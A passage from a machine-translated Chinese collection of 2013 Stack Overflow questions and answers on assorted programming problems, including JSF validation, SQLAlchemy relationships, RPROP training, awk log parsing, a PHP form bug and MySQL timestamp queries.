    maxlength="11" tabindex="22" /> 
```

在spring webflow定义中我添加了validation="false"，也尝试了binding="false"，但它没有帮助，虽然我不确定它是否相关，因为我有jsf验证问题，而不是spring webflow验证. 还要补充一点，我正在使用 Richfaces 4，这可能是有用的信息。

提前感谢您的回答。

斯特凡

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-05T10:04:58.000

您的问题与 Spring Webflows 或 Richfaces 无关，而是与处理对服务器的每个请求的标准 JSF 生命周期有关。

这个循环由几个阶段组成（谷歌“jsf 生命周期”有很多插图和解释）。其中之一是处理所有验证器。如果验证失败，将中止循环并发送响应（当前页面 + 消息）。将无法到达将处理您的取消按钮的方法调用阶段。

添加`immediate=true`到按钮时，它将将此按钮的处理移至流程验证阶段，因此将*在*处理验证失败事件（以及因此重新呈现页面）之前调用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T21:59:18.137

尝试将 immediate="true" 添加到您的取消按钮 XHTML

# java - 跟踪程序中的所有异常

> ID：15899559
> 
> 赞同：2
> 
> 时间：2013-04-09T10:32:19.213
> 
> 标签：java, exception, exception-handling, try-catch

我正在编写一个游戏程序，很少会出现异常。我希望能够记录我在一个单独的线程上得到的所有异常。我的程序已经是多线程的。在某些情况下，我使用 try catch，对于那些我可以为捕获的异常设置一个异常变量。但是，我希望能够找出所有线程上抛出的所有异常，而无需将每个语句都放在 try catch 中。为了澄清，我想要异常对象而不仅仅是异常的名称。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:41:25.690

你想要[Thread.UncaughtExceptionHandler](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Thread.UncaughtExceptionHandler.html)：

> 当线程由于未捕获的异常而突然终止时调用的处理程序接口。当线程由于未捕获的异常而即将终止时，Java 虚拟机将使用 Thread.getUncaughtExceptionHandler() 查询线程的 UncaughtExceptionHandler 并将调用处理程序的 uncaughtException 方法，将线程和异常作为参数传递。如果一个线程没有显式设置它的 UncaughtExceptionHandler，那么它的 ThreadGroup 对象充当它的 UncaughtExceptionHandler。如果 ThreadGroup 对象对处理异常没有特殊要求，它可以将调用转发给默认的未捕获异常处理程序。

有关详细信息，请参见[此处](https://stackoverflow.com/a/12014350/679982)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:40:08.577

这可以使用在这些情况下有用的*Spring AOP来完成。*

[@AfterThrowing 方面](http://camelcode.org/tutorial/Spring-AOP-@AfterThrowing-annotation-example.htm)

*为此，您将需要 Spring AOP 库。*

之前回答过类似的[问题。](https://stackoverflow.com/questions/10947933/aop-exception-handling)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:41:22.143

这可以通过作为[Java 平台调试器体系结构 (JPDA)](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/)一部分的[Java 调试接口 (JDI)](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html#jdi)来完成。

特别是，参见[`ExceptionRequest`](http://docs.oracle.com/javase/7/docs/jdk/api/jpda/jdi/com/sun/jdi/request/ExceptionRequest.html)和[`ExceptionEvent`](http://docs.oracle.com/javase/7/docs/jdk/api/jpda/jdi/com/sun/jdi/event/ExceptionEvent.html)。

# xml - 如何删除xslt中的空标签？

> ID：15899560
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:32:21.893
> 
> 标签：xml, xslt

这是我正在使用的 XML 文件：

```
 <data>
     <addressrecord id = "1bdd3154dc78bd75c5f1983d640005a6" type = "person">
     <category mode="main">customer</category>
     <firstname>Ann-margret</firstname>
     <lastname>Carlsson</lastname>
     <companyname></companyname>
         <address name="main">
           <street>s:t Gertrudsvägen 156</street>
           <zip>59341</zip>
           <city>Västervik</city>
          </address>
     <phone subtype="home">0490-36328</phone>
     <email></email>
   </addressrecord>
</data> 
```

我试图以表格格式而不是 HTML 表格格式将此 XML 放入 XSL。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T05:02:18.320

似乎您想保留所有内容而不是“电子邮件”元素，因为它是空的，您想删除它。这是解决方案：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:m="http://www.w3.org/1998/Math/MathML" xmlns="http://www.w3.org/1998/Math/MathML" exclude-result-prefixes="m">

  <xsl:template match="node() | @*">
    <xsl:copy>
      <xsl:apply-templates select="node() | @*"/>
    </xsl:copy>
  </xsl:template>

  <xsl:template match="*[not(child::node())]"/>

</xsl:stylesheet> 
```

# ios - 文档共享到其他应用程序

> ID：15899561
> 
> 赞同：1
> 
> 时间：2013-04-09T10:32:22.723
> 
> 标签：ios, ios5, uidocumentinteraction

我的应用程序是基于文档的，用户可以预览任何类型的文件，并且可以使用 open in 选项与其他应用程序一起编辑。如果文件被其他应用程序修改，如何将修改后的文件获取到我的应用程序？ios 4.2 以后的版本是否有任何公共共享目录来获取更新的文档。请帮助...

# python - 如何通过 Python 中的 API 查询在 SQL Alchemy 中插入关系数据（多对多）

> ID：15899565
> 
> 赞同：2
> 
> 时间：2013-04-09T10:32:27.807
> 
> 标签：python, api, sqlalchemy, database-schema, python-requests

编辑：我提出了一个[简短的问题](https://stackoverflow.com/questions/15902754/insert-relational-data-in-sql-alchemy-with-api-queries-in-python)，因为我认为这个问题太长了，抱歉

首先，我是数据库、编程语言等方面的新手……很抱歉，如果这个问题不是那么恰当或具体，任何帮助或指导将不胜感激……

我正在使用的上下文如下：我正在通过其 API 查询现有数据库，以便检索某些信息来设计我自己的数据库。

创建这个数据库的目的是例如让用户引入一个基因以了解它在生物体中的哪个位置过度（UP）或不足（DOWN）表达，以及在哪个实验中看到了这种类型的表达。

目前，我正在做的只是查询现有数据库并解析 json 结果以获取每个有机体部分、所有过度表达或表达不足的基因（以及我获得的每个基因的实验）已经报道了这种表达方式）

（在大脑中）

基因1

```
Experiment1     UP
Experiment2     UP
Experiment3     UP
Experiment4     DOWN 
```

基因2

```
Experiment5     DOWN
Experiment2     DOWN
Experiment3     DOWN
Experiment8     UP
Experiment9     DOWN 
```

我想我需要的不同表格是：“基因”、“器官”、“实验”和“表达类型”（和“基因2实验2器官”）

考虑到一个基因可以在不止一个organism_part中表达，并且可以有与不止一个实验相关的不同类型的表达，而一个实验可以包含不止一个基因（多对多关系）

我首先想知道的是如何添加关系数据并知道我的尝试是否朝着正确的方向发展，或者我应该更改数据库的架构/想法......

我的第一次尝试是这样的：

```
###########################################
DATABASE DEFINITION
###########################################

from sqlalchemy import create_engine, Column, Integer, String, Date, ForeignKey, Table, Float
from sqlalchemy.orm import sessionmaker, relationship, backref
from sqlalchemy.ext.declarative import declarative_base
import requests

Base = declarative_base()

Genes2experiments2organs = Table('genes2experiments2organs',Base.metadata,                                                                                                                                                                                                     
  Column('gene_id', String, ForeignKey('genes.id')),                                                                                                                                                                                                       
  Column('experiment_id', String, ForeignKey('experiments.id')),
  Column('organ_id', String, ForeignKey('organs.id'))
)

class Genes(Base):
    __tablename__ = 'genes'
    id = Column(String(45), primary_key=True)
    def __init__(self, id=""):
        self.id= id
    def __repr__(self):
        return "<genes(id:'%s')>" % (self.id)

class Experiments(Base):
    __tablename__ = 'experiments'
    id = Column(String(45), primary_key=True)
    experiments = relationship("Experiments", secondary=Genes2experiments2organs, backref="genes")
    organs = relationship("Organs", secondary=Genes2experiments2organs, backref="genes")
    def __init__(self, id=""):
        self.id= id
    def __repr__(self):
        return "<experiments(id:'%s')>" % (self.id)

class Organs(Base):
    __tablename__ = 'organs'
    id = Column(String(45), primary_key=True)
    def __init__(self, id=""):
        self.id= id
    def __repr__(self):
        return "<organs(id:'%s')>" % (self.id)

class Expression_type(Base):
    __tablename__ = 'expression_type'
    id = Column(String(45), primary_key=True)
    def __init__(self, id=""):
        self.id= id
    def __repr__(self):
        return "<expression_type(id:'%s')>" % (self.id)

#####################################################
INSERTING DATA
#####################################################

def setUp():
    global Session
    engine=create_engine('mysql://root:password@localhost/db_name?charset=utf8', pool_recycle=3600,echo=False)
    Session=sessionmaker(bind=engine)

def add_data():   ## I am just adding genes without taking into account the other related data to these genes.....
    session=Session()
    for i in range(0,1000,200):
        request= requests.get('http://www.ebi.ac.uk/gxa/api/v1',params={"updownInOrganism_part":"brain","rows":200,"start":i})
        result = request.json
        for item in result['results']:
            gene_to_add = item['gene']['ensemblGeneId']           
    session.commit()
    session.close()       

setUp()
add_data()
session=Session()
genes=session.query(Genes).all()
print "List of genes introduced:"
for gene in genes:
    print gene.id
session.close() 
```

所以，使用这段代码我只是填充“基因”表，但没有考虑与其他数据存在的关系，我必须包含在数据库中......做这样的事情的过程是什么，添加关系数据？还有一种避免插入重复基因的方法，例如在通过 API 查询填充表时？

顺便说一句，如您所见，我没有将所有多对多关系（次要）放在“基因”表中，因为我不确定我是正确还是完全错误...谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-02T17:32:33.283

这应该做你正在寻找的......

```
from sqlalchemy import (Column, create_engine, Integer, ForeignKey, Unicode,
                        Enum)
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, relationship

Base = declarative_base()

class Gene(Base):
    __tablename__ = 'gene'

    id = Column(Integer, primary_key=True)
    name = Column(Unicode(64), unique=True)

    def __init__(self, name):
        self.name = name

class Experiment(Base):
    __tablename__ = 'experiment'

    id = Column(Integer, primary_key=True)

class Organ(Base):
    __tablename__ = 'organ'

    id = Column(Integer, primary_key=True)
    name = Column(Unicode(64), unique=True)

    def __init__(self, name):
        self.name = name

class Measurement(Base):
    __tablename__ = 'measurement'

    id = Column(Integer, primary_key=True)
    experiment_id = Column(Integer, ForeignKey(Experiment.id))
    gene_id = Column(Integer, ForeignKey(Gene.id))
    organ_id = Column(Integer, ForeignKey(Organ.id))

    # Add your measured values here
    expression = Column(Enum('UP', 'DOWN'))
    # ...

    experiment = relationship(Experiment, backref='measurements')
    gene = relationship(Gene, backref='measurements')
    organ = relationship(Organ, backref='measurements')

    def __repr__(self):
        return 'Experiment %d: %s, %s, %s' % (self.experiment.id,
                         self.gene.name, self.organ.name, self.expression)

if __name__ == '__main__':
    engine = create_engine('sqlite://')
    session = sessionmaker(engine)()
    Base.metadata.create_all(engine)

    #
    # Creating the data
    #

    x = Gene('Gene X')
    y = Gene('Gene Y')
    z = Gene('Gene Z')

    heart = Organ('Heart')
    lungs = Organ('Lungs')
    brain = Organ('Brain')

    session.add_all([x, y, z, heart, lungs, brain])
    session.commit()

    experiment_1 = Experiment()
    experiment_1.measurements.extend(
            [Measurement(gene_id=x.id, organ_id=heart.id, expression='UP'),
             Measurement(gene_id=x.id, organ_id=lungs.id, expression='UP'),
             Measurement(gene_id=x.id, organ_id=brain.id, expression='DOWN'),
             Measurement(gene_id=y.id, organ_id=brain.id, expression='UP'),
             Measurement(gene_id=z.id, organ_id=brain.id, expression='DOWN')])

    experiment_2 = Experiment()
    experiment_2.measurements.extend(
            [Measurement(gene_id=y.id, organ_id=lungs.id, expression='UP'),
             Measurement(gene_id=y.id, organ_id=lungs.id, expression='UP'),
             Measurement(gene_id=y.id, organ_id=brain.id, expression='UP'),
             Measurement(gene_id=x.id, organ_id=brain.id, expression='UP'),
             Measurement(gene_id=z.id, organ_id=heart.id, expression='UP')])

    session.add_all([experiment_1, experiment_2])
    session.commit()

    #
    # Querying the data
    #

    print('All measurements in the first experiment')
    experiment = session.query(Experiment).filter(Experiment.id == 1).one()
    for measurement in experiment.measurements:
        print(measurement)
    print('')

    print('All measurements of Gene X')
    gene_x = session.query(Gene).filter(Gene.name == 'Gene X').one()
    for measurement in gene_x.measurements:
        print(measurement)
    print('')

    print('All measurements of the brain')
    the_brain = session.query(Organ).filter(Organ.name == 'Brain').one()
    for measurement in the_brain.measurements:
        print(measurement)
    print('') 
```

# c# - 在vs2012中重命名wp8项目

> ID：15899566
> 
> 赞同：0
> 
> 时间：2013-04-09T10:32:29.713
> 
> 标签：c#

我使用 Visual Studio 2012 创建了一个 wp8 项目。现在我想更改我的项目名称。我使用解决方案资源管理器进行了尝试，但重命名后项目已部署但未在模拟器中运行。

# gem - 为什么“宝石列表”没有显示“捆绑安装”显示的可用宝石？

> ID：15899568
> 
> 赞同：0
> 
> 时间：2013-04-09T10:32:34.727
> 
> 标签：gem, rvm, capistrano, passenger

在我的生产服务器上：

当我进行捆绑安装时，我可以看到“使用 schema_plus (1.0.1)”消息当我执行“宝石列表”时，我再也看不到它了。

为什么两者之间有区别？那不应该发生！使用 RVM 运行服务器似乎是一场噩梦。欢迎任何建议。

我没有任何 gemset，但服务器上的 'default 和 global 。当前 gemset 设置为“默认”

在部署 Capistrano 期间，使用以下选项：

```
set :bundle_flags, ""
set :bundle_dir, ""
require 'bundler/capistrano'
set :rvm_type, :system
require 'rvm/capistrano' 
```

我启用的 appache 模块：/etc/apache2/mods-available/passenger.load 使用以下配置：

```
LoadModule passenger_module /usr/local/rvm/gems/ruby-1.9.3-p392/gems/passenger-3.0.19/ext/apache2/mod_passenger.so
PassengerRoot /usr/local/rvm/gems/ruby-1.9.3-p392/gems/passenger-3.0.19
PassengerRuby /usr/local/rvm/wrappers/ruby-1.9.3-p392/ruby 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T13:56:04.083

检查这个答案[https://stackoverflow.com/a/14836718/497756](https://stackoverflow.com/a/14836718/497756) - 没有提到的额外选项`--system`- 尝试：

```
set :bundle_flags, "--system" 
```

# neural-network - 弹性传播的实施

> ID：15899579
> 
> 赞同：2
> 
> 时间：2013-04-09T10:33:05.577
> 
> 标签：neural-network

目前我正在尝试为我的网络实施弹性传播。我是根据 encog 实现来做这件事的，但有一件事我不明白：

RPROP 和 iRPROP+[的文档说当 change > 0: weightChange = -sign(gradient) * delta](http://www.heatonresearch.com/wiki/Resilient_Propagation)

[第 298 和 366 行的源代码](https://github.com/encog/encog-java-core/blob/master/src/main/java/org/encog/neural/networks/training/propagation/resilient/ResilientPropagation.java)没有减号！

因为我假设两者在某些情况下都是正确的：为什么两者之间有区别？

关于梯度：我在输出层中使用 tanh 作为活动。这是梯度的正确计算吗？

```
gradientOutput = (1 - lastOutput[j] * lastOutput[j]) * (target[j] - lastOutput[j]); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-11T00:22:08.230

After re-reading the relevant papers and looking up in a textbook I think the documentation of encog is not correct at this point. Why don't you just try it out by temporarily adding the minus-signs in the source code? If you use the same initial weights, you should receive exact the same results, given the documentation was correct. But in the end it just matters how you use the weightUpdate variable. If the author of the documentation is used to subtracting the weightUpdate from the weights instead of adding it, this will work.

**Edit**: I revisited the part about the gradient calculation in my original answer.

First, here is a brief explanation on how you can imagine the gradient for the weights in your output layer. First, you calculate the error between your outputs and the target values.

What you are now trying to do is to "blame" those neurons in the previous layer, which were active. Imagine the output neuron saying "Well, I have an error here, who is responsible?". Responsible are the neurons of the previous layer. Depending on the output being too small or too large compared to the target value, it will increase or decrease the weights to each of the neurons in the previous layers depending on how active they have been.

x is the activation of a neuron in the hidden layer.

o is the activation of the output neuron.

φ is the activation function of the output neuron, φ' its derivative.

**Edit2**: Corrected the part below. Added matrix style computation of backpropagation.

The error at each output neuron j is:

(1) δ[out, j] = φ'(o[j])(t - o[j])

The gradient for the weight connecting the hidden neuron i with the output neuron j:

(2) grad[i, j] = x[i] * δ[out, j]

The backpropagated error at each hidden neuron i with the weights w:

(3) δ[hid, i] = φ'(x)*∑w[i, j] * δ[out, j]

By repeatedly applying formula 2 and 3, you can backpropagate up to the input layer.

**Written in loops**, regarding one training sample:

The error at each output neuron j is:

```
for(int j=0; j < numOutNeurons; j++) {
  errorOut[j] = activationDerivative(o[j])*(t[j] - o[j]);
} 
```

The gradient for the weight connecting the hidden neuron i with the output neuron j:

```
for(int i=0; i < numHidNeurons; i++) {
  for(int j=0; j < numOutNeurons; j++) {
    grad[i][j] = x[i] * errorOut[j]        
  }      
} 
```

The backpropagated error at each hidden neuron i:

```
for(int i=0; i < numHidNeurons; i++) {
  for(int j=0; j < numOutNeurons; j++) {
    errorHid[i] = activationDerivative(x[i]) * weights[i][j] * errorOut[j]        
  }      
} 
```

In fully connected Multilayer Perceptrons without convolution or anything like that you can can use **standard matrix operations**, which is a lot faster.

Assuming each of your samples is a row in your input matrix and the columns are its attributes, you can propagate the input through your network like this:

```
activations[0] = input;
for(int i=0; i < numWeightMatrices; i++){
  activations[i+1] = activations[i].dot(weightMatrices[i]);
  activations[i+1] = activationFunction(activations[i+1]);
} 
```

Backpropagation then becomes:

```
n = numWeightMatrices;
error = activationDerivative(activations[n]) * (target - activations[n]);
for (int l=n-1; l >= 0; l--){
  gradient[l] = activations[l].transposed().dot(error);
  if (l > 0) {
     error = error.dot(weightMatrices[l].transposed());
     error = activationDerivative(activations[l])*error;
  }
} 
```

I omitted the bias neuron in the above explanations. In literature it is recommended to model the bias neuron as an additional column in each activation matrix which is alway 1.0 . You will need to deal with some slice assigns. When using the matrix backpropagation loop, do not forget to set the error at the position of the bias to 0 before each step!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-12T08:50:08.880

```
private float resilientPropagation(int i, int j){
    float gradientSignChange = sign(prevGradient[i][j]*gradient[i][j]);
    float delta = 0;
    if(gradientSignChange > 0){
        float change = Math.min((prevChange[i][j]*increaseFactor), maxDelta);
        delta = sign(gradient[i][j])*change;
        prevChange[i][j] = change;
        prevGradient[i][j] = gradient[i][j];
    }
    else if(gradientSignChange < 0){
        float change = Math.max((prevChange[i][j]*decreaseFactor), minDelta);
        prevChange[i][j] = change;
        delta = -prevDelta[i][j];
        prevGradient[i][j] = 0;
    }
    else if(gradientSignChange == 0){
        float change = prevChange[i][j];
        delta = sign(gradient[i][j])*change;
        prevGradient[i][j] = gradient[i][j];
    }
    prevDelta[i][j] = delta;
    return delta;       
}

gradient[i][j] = error[j]*layerInput[i];
weights[i][j]= weights[i][j]+resilientPropagation(i,j); 
```

# video-streaming - HTTP Live Streaming - 获取播放链接

> ID：15899587
> 
> 赞同：1
> 
> 时间：2013-04-09T10:33:33.650
> 
> 标签：video-streaming, google-tv

我想根据带宽跟踪正在播放的链接。

例如 m3u8 文件包含：

```
#EXTM3U
#EXT-X-STREAM-INF:PROGRAM-ID=1, BANDWIDTH=1950000
http://link1.M3U8
#EXT-X-STREAM-INF:PROGRAM-ID=1, BANDWIDTH=1500000
http://link2.M3U8
#EXT-X-STREAM-INF:PROGRAM-ID=1, BANDWIDTH=1200000
http://link3.M3U8
#EXT-X-STREAM-INF:PROGRAM-ID=1, BANDWIDTH=950000
http://link4.M3U8
#EXT-X-STREAM-INF:PROGRAM-ID=1, BANDWIDTH=800000
http://link5.M3U8
#EXT-X-STREAM-INF:PROGRAM-ID=1, BANDWIDTH=700000
http://link6.M3U8 
```

播放器以“ [http://link1.M3U8](http://link1.M3U8) ”开头，我想用这个链接展示 toast。比，在玩的时候，我的带宽改变了，播放器切换到“ [http://link4.M3U8](http://link4.M3U8) ”——我想用这个链接展示吐司。

这有可能做这样的事情吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T17:35:48.977

首先，你不能用你当前的带宽来烤面包。执行此操作的标准方法是以不同的比特率对电影进行编码，并带有说明比特率的文本覆盖。（我倾向于使用开源的[Big Buck Bunny](http://www.bigbuckbunny.org/)）

# jquery - 如何将 .input-validation-error 应用于 MVC4 中的 kendo 编辑器

> ID：15899588
> 
> 赞同：2
> 
> 时间：2013-04-09T10:33:34.873
> 
> 标签：jquery, asp.net-mvc, kendo-ui

我在我的 MVC4 应用程序中使用 Kendo Editor 并通过

```
 $("form").data("validator").settings.ignore = ":hidden:not(#Text)";
 $.validator.setDefaults({ ignore: [] }); 
```

Kendo 围绕 TextArea 构建它的编辑器并将其标记为隐藏字段。现在验证正在工作，但如果验证失败，则不会将 .input-validation-error 类添加到其中。谁能建议我如何做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T14:01:28.560

关键是输入验证错误类应用于原始隐藏字段......而不是编辑器。您必须拦截验证失败事件，并且必须手动将此类添加到编辑器中。

有两种方法可以拦截验证事件。更简单的方法是在传递给 setDefaults 方法的选项中指定自定义 showErrors 函数。验证插件文档解释了如何执行此操作。

另一种方法是重新定义验证器对象原型的元素和表单方法……这并不难，但需要你对验证插件有更深入的了解。

我建议使用第一种方法并在你的 showErrors 函数中放置一个断点，这样你就可以熟悉传递给它的参数的格式。添加自定义项后，不要忘记调用默认的 showErrors 函数。

不要忘记验证错误也必须被清除。现在，如果插件不会清除您的自定义错误（可能......因为它们没有附加到输入字段），您也将被迫覆盖元素和表单方法，因为如果没有错误，则不会调用 showErrors 函数，而在任何情况下都会调用上述方法，因此您可以将清除代码放入其中....

我的建议是集中精力在开始时显示错误，并且在您熟悉验证插件的工作方式之后，如果有必要，集中精力清除您的自定义错误（也许它们会被插件自动清除......不是确定插件如何清除其错误）

# python - Pygraphviz-error：AttributeError：'Graph'对象没有属性'encode'

> ID：15899589
> 
> 赞同：0
> 
> 时间：2013-04-09T10:33:35.327
> 
> 标签：python, pygraphviz

我现在正在尝试可视化我在 Python 中创建的图表。但是，一旦我应用 pygraphviz，我就会得到一个错误：

```
 A=pygraphviz.AGraph(name=N.name,strict=strict,directed=directed)
  File "/usr/lib/pymodules/python2.7/pygraphviz/agraph.py", line 177, in __init__
    self.handle=gv.agraphnew(name.encode(self.encoding),
AttributeError: 'Graph' object has no attribute 'encode' 
```

我的错误在哪里？

这是代码的相应部分：

```
import networkx as nx
import itertools
from itertools import combinations
from networkx import *
import pygraphviz as pgv

def blocks(n):
    nodes = com[n]
    edges = combinations(nodes, 2)
    g = nx.Graph()
    g.add_nodes_from(nodes)
    g.add_edges_from(edges)
    return g

s=blocks(0)
A=to_agraph(s)  
A.layout()
A.draw("network.ps") 
```

然而，在测试这个时，我检查了是否可以使用 pygraphviz 绘制任何其他图表。他们可以。只需键入以下内容：

```
import networkx as nx
from networkx import *
import pygraphviz as pgv

G=nx.complete_graph(5)
A=to_agraph(s)  
A.layout()
A.draw("network.ps") 
```

我得到了一张完整的图表。我该怎么做才能完成这项工作？非常感谢您提前！

# bash - 如何使用 egrep 提取零件

> ID：15899591
> 
> 赞同：0
> 
> 时间：2013-04-09T10:33:43.733
> 
> 标签：bash, awk, grep

我希望从一行数据中提取一些东西：

> **bin-66-776-33-22.hero.com** - - [ **17/oct/2012:04:16:12** +0100] "GET **/intro.txt** http/1.0" **200 25** "-" "hero/2.1 ( + [http://hero.com/intro.html](http://hero.com/intro.html)

粗体部分是我要提取的部分

我目前一直在使用

```
cat file.txt | egrep "^(.*) - .* \[(.*)12" 
```

然而，我知道这一点，并不能真正看到它是如何工作的，最后一点`'(.*)12'`看起来太多了。

我还想知道这在 bash 脚本中是否会更好？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:38:09.287

`awk`更适合这个：

```
$ awk -F'[[ ]' '{print $1,$5,$8,$10,$11}' file
bin-66-776-33-22.hero.com 17/oct/2012:04:16:12 /intro.txt 200 25 
```

# php - PHP 代码忽略了我的第一个输入

> ID：15899592
> 
> 赞同：0
> 
> 时间：2013-04-09T10:33:44.887
> 
> 标签：php, javascript, sql

我编写此代码以从用户那里获取任务及其否

```
<form method="POST" action="add.php">
 <tr> <td colspan="4">Tasks</td> </tr>
 <tr>
 <td colspan="4">
 <div id="tasksInput">
 Task Name<input type="text" name="mytasks[]"/>
 No <input type="text" name="myvol[]"/>
 <input type="button" value="add" onClick="add('tasksInput');">
 </div>
 </td> </tr>
<input type="submit"/> </form> 
```

Java脚本“tasksInput”函数是

```
<script type="text/javascript">
var count = 1;
var limitt = 100;
function add(divName2){
     if (count == limitt)  {
          alert("You have reached the limit of adding " + count + " inputs");
     }
     else {
          var newdiv2 = document.createElement('div');
          newdiv2.innerHTML = "Task " + (count + 1) + " <input type='text' name='mytask[]'>" +  "No <input type='text' name='myvol[]'/>";
          document.getElementById(divName2).appendChild(newdiv2);
          count++;
     }
}
</script> 
```

当我点击提交时，他必须将任务存储在数据库中，假设我将存储 A 1 B 2 C 3

在DB中，他将只存储任务B和C以及第1、2号你能帮我吗？

这是我的php代码

```
$needs=$_POST['mytask'];
$no=$_POST['myvol'];
$N = count($needs);

if(! empty($_POST['mytask']))
{
    for($i=0; $i < $N; $i++)
    {   
        $needname = $needs[$i];
        $noneed= $no[$i];
        if(! empty($needname ))
        {
            $query2=mysql_query("INSERT INTO projecttasks VALUES('','','$needname',' $noneed','')");
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:57:26.473

你的表格包含这个

`<input type="text" name="mytasks[]"/>`

并通过 JS 你试图添加这个

`<input type='text' name='mytask[]'>`

这些字段的名称不匹配。因此，在服务器上，您收到的并不完全符合您的期望

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:42:22.090

我不确定，但问题似乎是因为索引。JS 和 PHP 都从 0 开始计数数组。也许这可能是错误

改变这个：

```
var count = 1;
var limitt = 100; 
```

到：

```
var count = 0;
var limitt = 99; 
```

# irc - 预制 IRC 机器人

> ID：15899594
> 
> 赞同：0
> 
> 时间：2013-04-09T10:33:46.823
> 
> 标签：irc

我正在寻找一个预制的 IRC 机器人，我可以很容易地安装在我的一些频道上。它们主要是支持渠道，因此我们需要能够添加命令以发出重要通知等。

非常感谢所有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:49:09.260

你应该看看[Supybot](http://sourceforge.net/projects/supybot/)。它是一个用 Python 编写的可扩展且易于配置的 IRC 机器人。[你会在官网](http://sourceforge.net/apps/mediawiki/gribble/index.php?title=Supybot_Resources#Third-party_Plugins)或 GitHub 上找到很多插件。如果你碰巧知道一些 Python，它可能是你最好的选择。

您也可以尝试[Eggdrop](http://www.eggheads.org/)（或者`Windrop`基本上是`Eggdrop`Windows 版本）。许多**TCL**脚本（扩展）几乎随处可用。

我建议您访问[IRC-Wiki](http://www.irc-wiki.org/Category%3aBots)，当您需要有关 IRC 的任何信息时，它可能会很有用。

# oracle-apex - 阻止用户访问某些 apex 应用程序

> ID：15899597
> 
> 赞同：0
> 
> 时间：2013-04-09T10:33:55.433
> 
> 标签：oracle-apex

我们有 50 个顶级应用程序，目前任何用户都可以通过使用我们内联网页面上的网站链接访问 50 个应用程序中的任何一个。

您如何确定哪些用户可以访问某些顶点表单 - 我假设需要创建许多不同的顶点组，并且需要将人员分配给每个组？

这没关系，但我可以看到它在试图管理所有组时失控。我认为必须有更好的方法来阻止用户访问应用程序？

关于如何防止用户凭据在某些应用程序上工作的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T02:48:19.360

您可以使用授权方案，它可以应用于任何级别（例如整个应用程序、单个页面、区域、项目等）。

[http://docs.oracle.com/cd/E23903_01/doc/doc.41/e21674/sec_authorization.htm](http://docs.oracle.com/cd/E23903_01/doc/doc.41/e21674/sec_authorization.htm)

# c++ - TBB并发向量和STL向量的区别？

> ID：15899598
> 
> 赞同：3
> 
> 时间：2013-04-09T10:33:57.100
> 
> 标签：c++, stl, tbb

TBB Concurrent Vector 我们可以使用grow_by 和grow_to_at_least 动态调整大小。而在STL Vector 中也有调整大小的功能。那么有什么区别呢？

我遇到的不同是

**1\. concurrent_vector 在数组被清除之前永远不会移动元素，这可能是优于 STL std::vector（可以移动元素以调整向量大小）的优势，即使对于单线程代码也是如此。**

**2\. 仅当您确实需要动态调整它的大小而其他访问正在（或可能）进行中，或者如果您要求元素永不移动时，才使用 concurrent_vector。**

谁能解释这些观点，因为我对此感到困惑？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:49:18.600

我的意思是，一旦在 concurrent_vector 中分​​配了内存，它就会一直被使用，而 std::vector 在用完时分配两倍的内存并将存储的对象移动到新分配的块中。

**我假设**concurrent_vector正在添加新的内存块，但继续使用旧的。不移动对象很重要，因为它允许其他线程在重新调整大小时继续访问向量。它可能还有助于其他优化（例如保持缓存副本有效。）缺点是访问元素的速度稍慢，因为需要首先找到正确的块（额外的尊重。）

这是对 std::vector 内存分配的解释：[如何在 std::vector 中管理动态内存？](https://stackoverflow.com/questions/672352/how-is-dynamic-memory-managed-in-stdvector)

# ios - 使用 AVAudioRecorder 录制时创建 2 秒音频文件

> ID：15899599
> 
> 赞同：4
> 
> 时间：2013-04-09T10:34:04.143
> 
> 标签：ios, avaudiorecorder

我`AVAudioRecorder`用来记录iphone输入。我需要每 2 秒（录制时）从录制的文件中创建一个文件，而不会损坏我正在录制的主文件。

例子：

假设我正在录制一个 10 秒的文件

```
------------------
    10 Seconds 
```

在录制过程中，我需要创建 2 秒的“块”，以便通过 POST 请求发送。

```
--  --  --  --  --
 2   2   2   2   2 
```

有什么好的开始吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T07:38:12.707

为了解决这个问题，我发现我必须使用苹果的`Audio Queue Services`基于 ac 的 API。这是一个[链接](http://developer.apple.com/library/ios/#documentation/MusicAudio/Conceptual/AudioQueueProgrammingGuide/AboutAudioQueues/AboutAudioQueues.html)

这东西真的很酷！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T11:27:38.547

您真的需要将音频文件分成 2 秒的块以通过 POST 请求发送吗？您不能使用多部分表单数据发送数据吗？

尝试使用[ASIHTTPRequest](http://allseeing-i.com/ASIHTTPRequest/)之类的 API 通过请求发送音频文件。

# mysql - MySQL 时间戳选择

> ID：15899603
> 
> 赞同：0
> 
> 时间：2013-04-09T10:34:22.993
> 
> 标签：mysql

我的表中有一个名为时间戳的列，格式如下：2012-05-01 15:33:06

如何执行仅在过去 15 分钟内提取记录的选择？我在 PHP 手册中找到了这个，但不知道如何修改 15 分钟？有人可以给我一个样品吗？

